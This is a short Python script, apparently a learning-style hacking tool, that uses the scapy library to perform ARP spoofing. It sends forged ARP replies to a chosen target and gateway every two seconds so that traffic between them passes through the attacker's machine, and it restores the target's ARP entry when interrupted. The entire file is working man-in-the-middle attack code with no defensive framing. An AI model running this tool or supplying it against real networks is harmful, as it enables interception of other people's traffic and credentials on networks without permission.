#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def scan(target_ip):
    arp_request = scapy.ARP(pdst = target_ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"[-] No response from IP: {target_ip}")
        return None

def arpspoof(target_ip, gateway_ip):
    target_mac = scan(target_ip)
    if target_mac is None:
        return
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
    scapy.send(packet, verbose = False)

def restore(target_ip, gateway_ip):
    target_mac = scan(target_ip)
    gateway_mac = scan(gateway_ip)
    if target_mac is None or gateway_mac is None:
        return
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
    scapy.send(packet, verbose = False)

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Script")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway

    count = 2
    try:
        while True:
            arpspoof(target_ip, gateway_ip)
            arpspoof(gateway_ip, target_ip)
            print("\r[+] packets sent = " + str(count), end="")
            count += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nExiting..")
        restore(target_ip, gateway_ip)

if __name__ == "__main__":
    main()
